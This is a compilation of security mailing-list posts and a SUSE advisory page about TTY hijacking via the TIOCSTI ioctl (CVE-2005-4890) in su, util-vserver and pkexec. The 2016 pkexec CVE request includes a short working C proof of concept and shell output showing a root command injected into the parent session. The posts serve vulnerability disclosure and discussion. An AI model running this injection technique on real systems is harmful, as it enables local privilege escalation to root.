| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2014/10/20/9) [[next>]](2) [[<thread-prev]](../../../2014/10/20/9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <2ECE9D9EEF1F524185270138AE23265947D24A01@S0MSMAIL112.arc.local>
Date: Tue, 21 Oct 2014 08:23:55 +0000
From: Fiedler Roman <Roman.Fiedler@....ac.at>
To: Carlos Alberto Lopez Perez <clopez@...lia.com>
CC: "766073@...s.debian.org" <766073@...s.debian.org>,
        "vserver@...t.linux-vserver.org" <vserver@...t.linux-vserver.org>,
        "me@...fdog.net" <me@...fdog.net>,
        "oss-security@...ts.openwall.com"
	<oss-security@...ts.openwall.com>
Subject: AW: Multiple disputed issues in util-vserver

Hello Carlos,

> Von: Carlos Alberto Lopez Perez [mailto:clopez@...lia.com]
>
> On 14/10/14 16:31, Fiedler Roman wrote:
> > Hi,
> >
> > While fixing a bug, I noticed some strange behavior in linux vserver
> > virtualization, that I would call a security problems, but project
> > developers see it differently. Since the util-vserver packages and
patched
> > kernel were or are included in some Linux distros, I would be interested
in
> > the communities' opinion on that.
> >
> > Issue 1: When calling util-vserver tool on the host to execute a job
within
> > the guest, e.g. to install updates, the host process (in host PID ns)
might
> > end up being the child of a guest process (with PID only in guest ns),
thus
> > the parent PID of the host process pointing to a guest ns PID. If the
host
> > process wants to signal the parent process or some other tool operates
> using
> > the ppid, a host process might interact with another arbitrary host
process
> > on error (see [1]). Compared to issue 2-3, I'm not sure for myself if it
is
> > really a bug and what the correct behavior of kernel with pid namespaces
> > would be. At least it breaks bash process handling (gets stuck) when
calling
> > "vserver exec" in a certain way, start-stop-daemon or upstart might not
like
> > it also.
> >
> Is there any (practical) scenario in which an attacker that has
> compromised an vserver guest could use this behavior to compromise or
> execute code on the host (master)?

For code execution, I would guess, this should be less of a risk. The only
thing, I could think of, is that if namespace separation is not completely
clean, that it might be somehow possible, that the guest process (uid=0)
being the parent of the host process finds some way to ptrace et al control
the host process.

DOS might be more likely, therefore a malicious guest process just would
have to fill up the guest pid namespace until e.g. only some PIDs usually
occupied by swapper, IRQ-handler, ssh daemon ... on host are free in guest.
After reparenting, a host process might send a deadly signal to the wrong
parent. I do not known, if this is really a relevant scenario (therefore
asking about this), since even with cgroups/quota and all other things in
place, a guest might find other ways to starve the whole machine to death,
hence not needing such tricks.

> > Issue 2: When entering the container from the host or executing commands
> > within the container, e.g. to perform common administrative tasks, a
> > malicious login shell inside the container might overwrite the
> > /usr/sbin/vcontext on the host, thus allowing on to execute arbitrary
code
> > on the host with root privileges next time vcontext is invoked. See [3].
> > Feedback from developer: " Yes, vlogin is known to have several security
> > issues. It's a maintenance backdoor, much like the iLO or iDRAC on
> hardware.
> > If you can find ways to improve it, patches would be accepted, but I
doubt
> > it will ever be possible to do what it does securely." Project
documentation
> > does not strike out those restrictions (or at least I did not find that
or
> > the list of "several known security issues" online), other sources, e.g.
> > container vs system virtualization comparison strike out the importance
of
> > the feature to enter a guest from the host easily for maintenance, so I
> > guess that those tools were not useful just for me alone. This issue I
would
> > rate a killer for production use, e.g. for mass hosting.
> >
>
> Can you please send me the PoC for this issue ?

Sent off-list

> > Issue 3: It seems that handling of open tty FDs on enter, that allows to
> > inject arbitrary keyboard input to be read by the parent process, also
> > affects the tool to start the guest container. This seems to be the same
> > issue with "vserver start" as reported in [2] for vserver enter, which
was
> > classified as less relevant back than. My rating would be little lower
than
> > 2 but still quite high for mass hosting: manual restart, e.g. during
> > maintenance, seems quite common to me.
> >
>
> If I understand correctly, this (and the previous one) are
> CVE-2005-4890, isn't it?.
>
> <http://www.halfdog.net/Security/2012/TtyPushbackPrivilegeEscalation>

Yes, this is the stuff about the general problem, this issue is quite a
similar one for su. In both cases (su and vserver), a tool used to enter an
possibly compromised, lower privileged context from a higher privileged one
fail.

The CVE is only for su. For su it seems, that the issue is treated more a
bug than expected feature, but it seems, that it is still not fixed for
current Ubuntu release.

For vserver ...

> > From my point of view, those issues might be expected behavior as
claimed by
> > the developers, ....>

this is the state of discussion, so no bug.

> > ... but if so it should be at least stated more clearly in
> > documentation:
> >
> > a) never use any tools except vserver stop (to terminate the container)
to
> > interact with a running and possibly compromised container from the host
> > b) only use network/socket-based tools to connect to processes inside a
> > possibly compromised guest, e.g. SSH.
> > c) never start a possibly compromised container from interactive shell
to
> > avoid injection of shell commands
> >
> > Regarding documentation I would even vote for a solution d), that all
those
> > tools get a mandatory argument like
> > '--i-know-entering-insecure-container-may-kill-my-host' so that it is
not
> > very likely, that someone will use those tools for something else then
> > testing or nice-world administration.
> >
> > Opinions to issues 1-3?
> >
> > What about solutions?
>
> Halfdog (CC'ed) already suggested some possible solutions:
> <http://www.paul.sladen.org/vserver/archives/201211/0011.html>

This should handle the pty issues. But since it requires the admin not to
forget to use the manual workaround EVERY TIME, therefore man page update
should be done in any case. Fix with pty allocation (or detaching from pty
for vserver start) would be best solution. Without technical fix a
"--do-it-insecure" parameter would make it clear on command line, that I
want to proceed knowing the risks.

> > [1]
> > <http://list.linux->
> vserver.org/archive?mss:6788:201410:moeiomapkoefmmdnmcji
> > [2] <http://www.openwall.com/lists/oss-security/2012/11/05/8>
> > [3] Guest -> Host escape POC: C-code to be put as /bin/bash replacement
in
> > guest, will overwrite /usr/sbin/vcontext on host. Available on request

Download attachment "[smime.p7s](1/1)" of type "application/pkcs7-signature" (6344 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_79463740_20250125_011812.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](5) [[next>]](7) [[thread-next>]](../../../2016/02/26/3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>
Date: Thu, 25 Feb 2016 12:15:11 +0100
From: up201407890@...nos.dcc.fc.up.pt
To: oss-security@...ts.openwall.com
Cc: cve-assign@...re.org
Subject: CVE Request: pkexec tty hijacking via TIOCSTI ioctl

Bug report to redhat:
<https://bugzilla.redhat.com/show_bug.cgi?id=1300746>

When executing a program via "pkexec --user nonpriv program" the
nonpriv session can
escape to the parent session by using the TIOCSTI ioctl to push
characters into the
terminal's input buffer, allowing privilege escalation.
This issue has been fixed in "su" by calling setsid() and in "sudo" by
using the
"use_pty" flag.

# cat test.c
#include <sys/ioctl.h>

int main()
{
  char *cmd = "id\n";
  while(*cmd)
   ioctl(0, TIOCSTI, cmd++);
}

# gcc test.c -o test
# id saken
uid=1000(saken) gid=1000(saken) groups=1000(saken)

# pkexec --user saken ./test ----> last command i type in
id
# id ----> did not type this
uid=0(root) gid=0(root) groups=0(root)

This is similar to CVE-2005-4890 and CVE-2013-6409

I'd like to request a CVE for this issue.

PS: I don't believe any of the previous mentions of fixes for "su" and
"sudo" would work here, since executing a shell via pkexec would make it not
have job control.

Thanks,
Federico Bento

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_67cfffda_20250125_011808.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20130520174343.6489CE673F@smtp.hushmail.com>
Date: Mon, 20 May 2013 17:43:40 +0000
From: "mancha" <mancha1@...h.com>
To: oss-security@...ts.openwall.com
Subject: tty-hijacking & CVE-2005-4890 - redux

Hello.

A recent use-case on Slackware made me re-visit CVE-2005-4890
in the context of "su -c". Particularly, shadow's implementation
as of shadow 4.1.5.

During the discussions of this CVE (see footer links), it was
pointed out shadow's fix is partial given interactive su remains
vulnerable to tty-hijacking. It was also mentioned this vector
is less worrisome given use cases for interactive su are primarily
privilege escalation.

The CVE was always a bit controversial with many believing
using su and sudo to drop privileges is unsafe and more an
administration issue than a design flaw.

All that said, at the very least would it be reasonable to
apply the same threat-assessment criterion to the crippling
of "su -c" and not drop the controlling tty for the case when
the callee is root?

Slackware doesn't use PAM so the fix in shadow relies on a
TIOCNOTTY ioctl() request and not a setsid() call. One result
of this change is summarized in the table below:

                                        shadow
                             4.1.4.3   4.1.5.1   4.1.5.1+patch*

1. As unpriv user user1:
xterm -e su -c $COMM          SUCCESS    FAIL     SUCCESS
xterm -e su user2 -c $COMM    SUCCESS    FAIL     FAIL

2. As root:
xterm -e su user1 -c $COMM    SUCCESS    FAIL     FAIL

-----
* See attached

Cheers.

--mancha

===

[1] <http://thread.gmane.org/gmane.comp.security.oss.general/5172>
[2] <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=628843>
Download attachment "[shadow-4.1.5.1-tty.diff](3/1)" of type "application/octet-stream" (321 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from marc.info_eaa71c42_20250126_050055.html ===


| Search: [] List [] Subjects [] Authors [] Bodies for list 'oss-security' |
| --- |

Set Page Width:
[ [80](?l=oss-security&s=CVE-2005-4890&w=1) ]
[ [90](?l=oss-security&s=CVE-2005-4890&w=2) ]
[ [100](?l=oss-security&s=CVE-2005-4890&w=3) ]
[ [120](?l=oss-security&s=CVE-2005-4890&w=4) ]

[![Viewing messages in list](images/folderopen.gif) **oss-security**](?l=oss-security&r=1&w=2)
[![- ](images/bookclosed.gif) 2025-01-01 - 2025-02-01 (77 messages)](?l=oss-security&r=1&b=202501&w=2)
```
  1. 2018-06-13  [Re: [oss-security] Are `su user' and/or `sudo -u user](?l=oss-security&m=152887861321713&w=2) [oss-secur](?l=oss-security&w=2) Georgi Guninski
  2. 2018-06-12  [Re: [oss-security] Are `su user' and/or `sudo -u user](?l=oss-security&m=152881830305250&w=2) [oss-secur](?l=oss-security&w=2) Jordan Glover
  3. 2018-06-12  [Re: [oss-security] Are `su user' and/or `sudo -u user](?l=oss-security&m=152880354900335&w=2) [oss-secur](?l=oss-security&w=2) Jakub Wilk
  4. 2016-02-25  [[oss-security] CVE Request: pkexec tty hijacking via](?l=oss-security&m=145640949614375&w=2)  [oss-secur](?l=oss-security&w=2) up201407890
  5. 2014-12-15  [Re: [oss-security] Multiple disputed issues in util-v](?l=oss-security&m=141866648632594&w=2) [oss-secur](?l=oss-security&w=2) Fiedler Roman
  6. 2014-10-21  [AW: [oss-security] Multiple disputed issues in util-v](?l=oss-security&m=141387991905576&w=2) [oss-secur](?l=oss-security&w=2) Fiedler Roman
  7. 2014-10-20  [Re: [oss-security] Multiple disputed issues in util-v](?l=oss-security&m=141383312822084&w=2) [oss-secur](?l=oss-security&w=2) Carlos Alberto Lop
  8. 2013-11-29  [Re: [oss-security] CVE Request: adequate: privilege e](?l=oss-security&m=138571221420788&w=2) [oss-secur](?l=oss-security&w=2) Kurt Seifried
  9. 2013-11-28  [[oss-security] CVE Request: adequate: privilege escal](?l=oss-security&m=138563892917317&w=2) [oss-secur](?l=oss-security&w=2) Salvatore Bonaccor
 10. 2013-05-20  [[oss-security] tty-hijacking & CVE-2005-4890 - redux](?l=oss-security&m=136907457229847&w=2)  [oss-secur](?l=oss-security&w=2) mancha
 11. 2012-11-06  [Re: [oss-security] Re: TTY handling when executing co](?l=oss-security&m=135221083823424&w=2) [oss-secur](?l=oss-security&w=2) Marcus Meissner
 12. 2011-12-20  [[oss-security] CVE request -- coreutils -- tty hijack](?l=oss-security&m=132435416605607&w=2) [oss-secur](?l=oss-security&w=2) Kurt Seifried

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.suse.com_8ea51e81_20250126_050053.html ===

![](/assets/img/1px-transparent.gif)
![](/assets/img/1px-transparent.gif)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)
![SUSE Federal Logo](https://www.suse.com/assets/img/fed_logo.png)](https://www.suse.com)
Exit SUSE Federal  >

[Customer Center](https://scc.suse.com/home)

Account

Hello
[Update Your Account](https://www.suse.com/account/update/)
[Log Out](https://www.suse.com/saml2/logout/)

[Login](https://www.suse.com/saml2/login/)
[Create Account](https://www.suse.com/account/create/)
[Update Your Account](https://www.suse.com/account/update/)

English

Language
[Deutsch](https://www.suse.com/de-de/security/cve/CVE-2005-4890.html)
[English](https://www.suse.com/security/cve/CVE-2005-4890.html)
[EspaÃ±ol](https://www.suse.com/es-es/security/cve/CVE-2005-4890.html)
[FranÃ§ais](https://www.suse.com/fr-fr/security/cve/CVE-2005-4890.html)
[ä¸­æ(ç®ä½)](https://www.suse.com/zh-cn/security/cve/CVE-2005-4890.html)
[æ¥æ¬èª](https://www.suse.com/ja-jp/security/cve/CVE-2005-4890.html)
[íêµ­ì´](https://www.suse.com/ko-kr/security/cve/CVE-2005-4890.html)
[PortuguÃªs (Brasil)](https://www.suse.com/pt-br/security/cve/CVE-2005-4890.html)

[Shop](https://www.suse.com/shop/)

[View Cart](https://buy.suse.com/store?Action=DisplayPage&Env=BASE&SiteID=suse&id=ThreePgCheckoutShoppingCartPage)

[![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)](https://www.suse.com)
Exit SUSE Federal  >

[Shop](https://www.suse.com/shop/)
[SUSECON 25](https://www.suse.com/susecon/)
[Customer](https://scc.suse.com/home)

Federal Solutions

Products

Solutions

Support

Partners

Communities

About

[Contact Us](https://www.suse.com/contact/)

[Free Downloads](https://www.suse.com/products/)

 Back

 Back
[![Icon](https://www.suse.com/assets/img/icons/Linux-one-color.svg)
Linux](https://www.suse.com/solutions/business-critical-linux/ "Linux")

* [SUSE Linux Enterprise Server](https://www.suse.com/products/server/)
* [SUSE Linux Enterprise Server

  for SAP Applications](https://www.suse.com/products/sles-for-sap/)
* [SUSE Linux Micro](https://www.suse.com/products/micro/)
* [SUSE Multi-Linux Support](https://www.suse.com/products/multi-linux-support/)
* [SUSE Multi-Linux Manager](https://www.suse.com/products/multi-linux-manager/)

[![Icon](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)
Cloud Native](https://www.suse.com/solutions/enterprise-container-management/ "Cloud Native")

* [SUSE Rancher Prime](https://www.suse.com/products/rancher/)
* [Virtualization (Harvester)](https://www.suse.com/products/rancher/virtualization/)
* [Storage (Longhorn)](https://www.suse.com/products/rancher/storage/)
* [Security (NeuVector)](https://www.suse.com/products/rancher/security/)
* [Observability](https://www.suse.com/solutions/observability/)
* [SUSE Cloud Observability](https://www.suse.com/products/cloud/observability/)

[![Icon](https://www.suse.com/assets/img/icons/Edge-one-color.svg)
Edge](https://www.suse.com/solutions/edge-computing/ "Edge")

* [SUSE Edge](https://www.suse.com/products/edge/)
* [SUSE Edge for Telco](https://www.suse.com/products/edge-for-telco/)

[![Icon](https://www.suse.com/assets/img/icons/AI-one-color.svg)
AI](https://www.suse.com/solutions/edge-computing/ "AI")

* [SUSE AI](https://www.suse.com/products/ai/)

[All Products](https://www.suse.com/products/)

 Back
Foundational

* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2005-4890

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2005-4886.html) [[Index]](index.html) [[Next]](CVE-2005-4900.html)

### Upstream information

[CVE-2005-4890 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4890)

#### Description

There is a possible tty hijacking in shadow 4.x before 4.1.5 and sudo 1.x before 1.7.4 via "su - user -c program". The user session can be escaped to the parent session by using the TIOCSTI ioctl to push characters into the input buffer to be read by the next process.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [moderate](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database | SUSE |
| Base Score | 7.2 | 6.2 |
| Vector | AV:L/AC:L/Au:N/C:C/I:C/A:C | AV:L/AC:H/Au:N/C:C/I:C/A:C |
| Access Vector | Local | Local |
| Access Complexity | Low | High |
| Authentication | None | None |
| Confidentiality Impact | Complete | Complete |
| Integrity Impact | Complete | Complete |
| Availability Impact | Complete | Complete |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 7.8 |
| Vector | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| Attack Vector | Local |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality Impact | High |
| Integrity Impact | High |
| Availability Impact | High |
| CVSSv3 Version | 3.1 |

SUSE Bugzilla entries: [697897](https://bugzilla.suse.com/show_bug.cgi?id=697897) [RESOLVED / FIXED], [968375](https://bugzilla.suse.com/show_bug.cgi?id=968375) [NEW]
### SUSE Security Advisories:

openSUSE-SU-2012:0621-1

---

### Status of this issue by product and package

Please note that this evaluation state might be work in progress, incomplete or outdated. Also information for service packs in the LTSS phase is only included for issues meeting the LTSS criteria. If in doubt, feel free to contact us for clarification. The updates are grouped by state of their lifecycle. SUSE product lifecycles are documented [on the lifecycle page](https://www.suse.com/lifecycle/).

| Product(s) | Source package | State |
| --- | --- | --- |
| Products past their end of life and not receiving proactive updates anymore. | | |
| SLES for SAP Applications 11 SP2 | coreutils | Released |
| SLES for SAP Applications 11 SP3 | coreutils | Released |
| SUSE Linux Enterprise Desktop 11 SP1 | coreutils | Released |
| SUSE Linux Enterprise Desktop 11 SP2 | coreutils | Released |
| SUSE Linux Enterprise Desktop 11 SP3 | coreutils | Released |
| SUSE Linux Enterprise Desktop 11 SP4 | coreutils | Released |
| SUSE Linux Enterprise Enterprise Server 11 SP1 for SAP Enterprise Search | coreutils | Released |
| SUSE Linux Enterprise Point of Sale 11 SP3 | coreutils | Affected |
| SUSE Linux Enterprise Point of Service 11 SP3 | coreutils | Already fixed |
| SUSE Linux Enterprise Server 10 SP4-LTSS | coreutils | Affected |
| SUSE Linux Enterprise Server 11 SP1 | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP1 LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP1-LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP2 | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP2 LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP2-LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP3 | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP3 LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP3-LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP4 | coreutils | Affected |
| SUSE Linux Enterprise Server 11 SP4 LTSS | coreutils | Released |
| SUSE Linux Enterprise Server 11 SP4-LTSS | coreutils | Released |
| SUSE Linux Enterprise Server for SAP Business All-in-One 11 SP1 | coreutils | Released |

---

### SUSE Timeline for this CVE

CVE page created: Fri Jun 28 04:59:48 2013

CVE page last modified: Tue Dec 17 19:13:17 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
